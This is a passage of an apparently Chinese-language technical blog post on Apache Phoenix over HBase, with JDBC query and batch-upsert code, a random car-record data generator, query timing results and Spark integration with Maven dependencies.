class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 创角标</span></span><br><span class="line">       create();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 注意更新用的是upsert 插入和更新一样的</span></span><br><span class="line">       upsert();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 查询 查询出结果并打印</span></span><br><span class="line">       query();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 删除表</span></span><br><span class="line"><span class="comment">//       drop();</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本操作和JDBC基本一样，只要在Class里面修改成Phoenix就可以</p><h2 id="无索引简单测试"><a href="#无索引简单测试" class="headerlink" title="无索引简单测试"></a>无索引简单测试</h2><h3 id="首先上结论"><a href="#首先上结论" class="headerlink" title="首先上结论:"></a>首先上结论:</h3><p>针对主键根据单纬度查询,数据量对搜索结果影响非常小,如果仅仅是返回单条结果的查询,能够达到毫秒级反应速度,根据主键批量查询的话速度由表大小和返回数量决定,从目前数据量11亿左右响应速度也在秒级.</p><p>但是如果没有建立索引,想根据非主键查询,反应时间会非常久.</p><h3 id="响应时间测试"><a href="#响应时间测试" class="headerlink" title="响应时间测试"></a>响应时间测试</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">       Class.forName(<span class="string">"org.apache.phoenix.jdbc.PhoenixDriver"</span>);</span><br><span class="line"></span><br><span class="line">       String url = <span class="string">"jdbc:phoenix:datanode128:2181"</span>;</span><br><span class="line"></span><br><span class="line">       Connection conn = DriverManager.getConnection(url);</span><br><span class="line"></span><br><span class="line">       Statement statement = conn.createStatement();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">long</span> time = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">       ResultSet rs = statement.executeQuery(<span class="string">"select * from test"</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">           String myKey = rs.getString(<span class="string">"MYKEY"</span>);</span><br><span class="line">           String myColumn = rs.getString(<span class="string">"MYCOLUMN"</span>);</span><br><span class="line"></span><br><span class="line">           System.out.println(<span class="string">"myKey="</span> + myKey + <span class="string">"myColumn="</span> + myColumn);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">long</span> timeUsed = System.currentTimeMillis() - time;</span><br><span class="line"></span><br><span class="line">       System.out.println(<span class="string">"time "</span> + timeUsed + <span class="string">"mm"</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 关闭连接</span></span><br><span class="line">       rs.close();</span><br><span class="line">       statement.close();</span><br><span class="line">       conn.close();</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><p>120ms</p><p>CREATE TABLE IF NOT EXISTS “employee” (“no” VARCHAR(10) NOT NULL PRIMARY KEY, “company”.”name” VARCHAR(30),”company”.”position” VARCHAR(20), “family”.”tel” VARCHAR(20), “family”.”age” INTEGER);</p><p>csv columns from database. CSV Upsert complete. 1000000 rows upserted </p><p><strong>测试结果：</strong></p><p>100w： insert 70s         count:1.032s     groupby PK: 0.025s </p><p>500w：insert 314s   count:1.246s   groupby PK:0.024s </p><p>从结果看，随着数量级的增加，查询时耗也随之增加，有一个例外，就是当用索引字段为主键时作聚合查询时，用时相差不大。总的来说，Phoenix在用到索引时查询性能会比较好。那对于Count来说，如果不用Phoenix,用HBase自带的Count耗时是怎样的呢，测了一下，HBase Count 100万需要33s, 500万需要139s，性能还是很差的。对于大表来说基本不能用Count来统计行数，还得依赖于基于Coprocessor机制来统计。</p><h2 id="JDBC模拟数据代码"><a href="#JDBC模拟数据代码" class="headerlink" title="JDBC模拟数据代码"></a>JDBC模拟数据代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.RandomUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.time.DateUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">//id，日期,号牌号码，车型，颜色</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BuildData</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> SimpleDateFormat sdf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyyMMddHHmmss"</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String[] ys = <span class="keyword">new</span> String[] &#123; <span class="string">"红"</span>, <span class="string">"橙"</span>, <span class="string">"黄"</span>, <span class="string">"绿"</span>, <span class="string">"青"</span>, <span class="string">"蓝"</span>, <span class="string">"紫"</span> &#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String[] cx = <span class="keyword">new</span> String[] &#123; <span class="string">"大众"</span>, <span class="string">"别克"</span>, <span class="string">"奥迪"</span>, <span class="string">"宝马"</span> &#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String[] zm = <span class="keyword">new</span> String[] &#123; <span class="string">"A"</span>, <span class="string">"B"</span>, <span class="string">"C"</span>, <span class="string">"D"</span>, <span class="string">"E"</span>, <span class="string">"F"</span>, <span class="string">"G"</span>, <span class="string">"H"</span>, <span class="string">"I"</span>, <span class="string">"G"</span>, <span class="string">"K"</span>, <span class="string">"L"</span>, <span class="string">"M"</span>, <span class="string">"N"</span>,</span><br><span class="line"><span class="string">"O"</span>, <span class="string">"P"</span>, <span class="string">"Q"</span>, <span class="string">"R"</span>, <span class="string">"S"</span>, <span class="string">"T"</span>, <span class="string">"U"</span>, <span class="string">"V"</span>, <span class="string">"W"</span>, <span class="string">"X"</span>, <span class="string">"Y"</span>, <span class="string">"Z"</span> &#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String[] zmSz = <span class="keyword">new</span> String[] &#123; <span class="string">"A"</span>, <span class="string">"B"</span>, <span class="string">"C"</span>, <span class="string">"D"</span>, <span class="string">"E"</span>, <span class="string">"F"</span>, <span class="string">"G"</span>, <span class="string">"H"</span>, <span class="string">"I"</span>, <span class="string">"G"</span>, <span class="string">"K"</span>, <span class="string">"L"</span>, <span class="string">"M"</span>, <span class="string">"N"</span>,</span><br><span class="line"><span class="string">"O"</span>, <span class="string">"P"</span>, <span class="string">"Q"</span>, <span class="string">"R"</span>, <span class="string">"S"</span>, <span class="string">"T"</span>, <span class="string">"U"</span>, <span class="string">"V"</span>, <span class="string">"W"</span>, <span class="string">"X"</span>, <span class="string">"Y"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>,</span><br><span class="line"><span class="string">"0"</span> &#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String[] prv = <span class="keyword">new</span> String[] &#123; <span class="string">"京"</span>, <span class="string">"津"</span>, <span class="string">"沪"</span>, <span class="string">"渝"</span>, <span class="string">"冀"</span>, <span class="string">"晋"</span>, <span class="string">"辽"</span>, <span class="string">"吉"</span>, <span class="string">"黑"</span>, <span class="string">"苏"</span>, <span class="string">"浙"</span>, <span class="string">"皖"</span>, <span class="string">"闽"</span>, <span class="string">"赣"</span>,</span><br><span class="line"><span class="string">"鲁"</span>, <span class="string">"豫"</span>, <span class="string">"鄂"</span>, <span class="string">"湘"</span>, <span class="string">"粤"</span>, <span class="string">"琼"</span>, <span class="string">"川"</span>, <span class="string">"贵"</span>, <span class="string">"云"</span>, <span class="string">"陕"</span>, <span class="string">"甘"</span>, <span class="string">"青"</span>, <span class="string">"台"</span>, <span class="string">"蒙"</span>, <span class="string">"桂"</span>, <span class="string">"宁"</span>, <span class="string">"新"</span>, <span class="string">"藏"</span>, <span class="string">"港"</span>, <span class="string">"澳"</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Calendar start = Calendar.getInstance();</span><br><span class="line"><span class="keyword">private</span> Calendar end = Calendar.getInstance();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> dayOfSecond = <span class="number">250</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BuildData</span><span class="params">(<span class="keyword">int</span> dayOfSecond, Date start, Date end)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.start.setTime(start);</span><br><span class="line"><span class="keyword">this</span>.end.setTime(end);</span><br><span class="line"><span class="keyword">this</span>.dayOfSecond = dayOfSecond;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成数据</span></span><br><span class="line"><span class="keyword">public</span> String[][] buildData() &#123;</span><br><span class="line"><span class="keyword">if</span> (dayOfSecond &gt; <span class="number">0</span>) &#123;</span><br><span class="line">String date = getDate();</span><br><span class="line"><span class="keyword">if</span> (date == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">String[][] result = <span class="keyword">new</span> String[dayOfSecond][<span class="number">5</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dayOfSecond; i++) &#123;</span><br><span class="line">result[i][<span class="number">0</span>] = getId();</span><br><span class="line">result[i][<span class="number">1</span>] = date;</span><br><span class="line">result[i][<span class="number">2</span>] = getHphm();</span><br><span class="line">result[i][<span class="number">3</span>] = getCx();</span><br><span class="line">result[i][<span class="number">4</span>] = getYs();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// id</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">String string = UUID.randomUUID().toString().replaceAll(<span class="string">"-"</span>, <span class="string">""</span>);</span><br><span class="line"><span class="keyword">return</span> string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日期</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (end.getTime().getTime() &gt;= start.getTime().getTime()) &#123;</span><br><span class="line">start.setTime(DateUtils.addSeconds(start.getTime(), <span class="number">1</span>));</span><br><span class="line"><span class="keyword">return</span> sdf.format(start.getTime());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 车牌 苏E3G02D</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getHphm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">String p = prv[RandomUtils.nextInt(<span class="number">0</span>, prv.length)];</span><br><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder(p);</span><br><span class="line">sb.append(zm[RandomUtils.nextInt(<span class="number">0</span>, zm.length)]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">sb.append(zmSz[RandomUtils.nextInt(<span class="number">0</span>, zmSz.length)]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 车型</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getCx</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> nextInt = RandomUtils.nextInt(<span class="number">0</span>, cx.length);</span><br><span class="line"><span class="keyword">return</span> cx[nextInt];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 颜色</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getYs</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> nextInt = RandomUtils.nextInt(<span class="number">0</span>, ys.length);</span><br><span class="line"><span class="keyword">return</span> ys[nextInt];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CarVo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String id;</span><br><span class="line"><span class="keyword">private</span> String date;</span><br><span class="line"><span class="keyword">private</span> String hphm;</span><br><span class="line"><span class="keyword">private</span> String cx;</span><br><span class="line"><span class="keyword">private</span> String ys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.id = id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> date;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDate</span><span class="params">(String date)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.date = date;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHphm</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> hphm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHphm</span><span class="params">(String hphm)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.hphm = hphm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getCx</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> cx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCx</span><span class="params">(String cx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.cx = cx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getYs</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ys;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setYs</span><span class="params">(String ys)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.ys = ys;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.dbutils.QueryRunner;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.time.DateUtils;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InsertData</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Logger log = LoggerFactory.getLogger(InsertData.class);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">args = <span class="keyword">new</span> String[] &#123; <span class="string">"20170103000000"</span>, <span class="string">"20170131000000"</span> &#125;;</span><br><span class="line">Date start = DateUtils.parseDate(args[<span class="number">0</span>], <span class="string">"yyyyMMddHHmmss"</span>);</span><br><span class="line">Date end = DateUtils.parseDate(args[<span class="number">1</span>], <span class="string">"yyyyMMddHHmmss"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Connection connection = <span class="keyword">null</span>;</span><br><span class="line">Class.forName(<span class="string">"org.apache.phoenix.jdbc.PhoenixDriver"</span>);</span><br><span class="line">connection = DriverManager.getConnection(<span class="string">"jdbc:phoenix:172.16.0.128:2181"</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">QueryRunner queryRunner = <span class="keyword">new</span> QueryRunner();</span><br><span class="line"></span><br><span class="line">BuildData buildData = <span class="keyword">new</span> BuildData(<span class="number">250</span>, start, end);</span><br><span class="line">String[][] buildData2 = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> all = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((buildData2 = buildData.buildData()) != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">int</span>[] batch = queryRunner.batch(connection, <span class="string">"upsert into car_test values(?,?,?,?,?)"</span>, buildData2);</span><br><span class="line">num += batch.length;</span><br><span class="line">all += batch.length;</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">1000</span>) &#123;</span><br><span class="line"><span class="keyword">long</span> time1 = System.currentTimeMillis();</span><br><span class="line">connection.commit();</span><br><span class="line"><span class="keyword">long</span> time2 = System.currentTimeMillis();</span><br><span class="line">num = <span class="number">0</span>;</span><br><span class="line">System.out.println(<span class="keyword">new</span> Date() + <span class="string">":"</span> + <span class="string">"-start:"</span> + args[<span class="number">0</span>] + <span class="string">"-end:"</span> + args[<span class="number">1</span>] + <span class="string">"--"</span> + all + <span class="string">"--"</span></span><br><span class="line">+ (time2 - time1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// num++;</span></span><br><span class="line"><span class="comment">// all++;</span></span><br><span class="line"><span class="comment">// if (num &gt; 1000) &#123;</span></span><br><span class="line"><span class="comment">// num=0;</span></span><br><span class="line"><span class="comment">// System.out.println(new Date() + ":" + "-start:" + args[0] +</span></span><br><span class="line"><span class="comment">// "-end:" + args[1] + "--" + all);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Phoenix和Spark整合"><a href="#Phoenix和Spark整合" class="headerlink" title="Phoenix和Spark整合"></a>Phoenix和Spark整合</h2><p>数据格式：</p><table><thead><tr><th>imei</th><th>alarm_type</th><th>lat</th><th>lng</th><th>device_status</th><th>mc_type</th><th>read_status</th><th>speed</th><th>addr</th><th>index_name</th><th>user_id</th><th>user_parent_id</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>spark写入HBase(通过Phoenix)</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">sparkPhoenixSave</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args:<span class="type">Array</span>[<span class="type">String</span>])&#123;</span><br><span class="line">       <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setAppName(<span class="string">"sparkToPhoenix"</span>)</span><br><span class="line">       <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(<span class="type">SparkConf</span>)</span><br><span class="line">       <span class="keyword">val</span> sqlContext = <span class="keyword">new</span> org.apache.spark.sql.<span class="type">SQLContext</span>(sc)</span><br><span class="line">       <span class="keyword">import</span> sqlContext.implicits._</span><br><span class="line">       </span><br><span class="line">       <span class="comment">// 从集合创建rdd</span></span><br><span class="line">       <span class="keyword">val</span> rdd = <span class="type">List</span>((<span class="number">1</span>L,<span class="string">"1"</span>,<span class="number">1</span>),(<span class="number">2</span>L,<span class="string">"2"</span>,<span class="number">2</span>),(<span class="number">3</span>L,<span class="string">"3"</span>,<span class="number">3</span>))</span><br><span class="line">       <span class="comment">// 从rdd创建DF</span></span><br><span class="line">       <span class="keyword">val</span> df = rdd.toDF(<span class="string">"id"</span>,<span class="string">"col1"</span>,<span class="string">"col2"</span>)</span><br><span class="line">       df.show()</span><br><span class="line">       </span><br><span class="line">       <span class="comment">// Save to OUTPUT_TABLE</span></span><br><span class="line">       df.save(<span class="string">"org.apache.phoenix.spark"</span>,<span class="type">SaveMode</span>.<span class="type">Overwrite</span>,<span class="type">Map</span>(<span class="string">"table"</span> -&gt; <span class="string">"GPS"</span>,<span class="string">"zkUrl"</span> -&gt; <span class="string">"172.16.0.126:2181/hbase-unsecure"</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题点：</p><p>依赖方面有几个问题：</p><p>集群升级后采用了Phoenix 4.14 - HBase 1.2.0版本。</p><p>这个版本的依赖经过一段时间的试验之后选择了如下的版本:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-sql_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 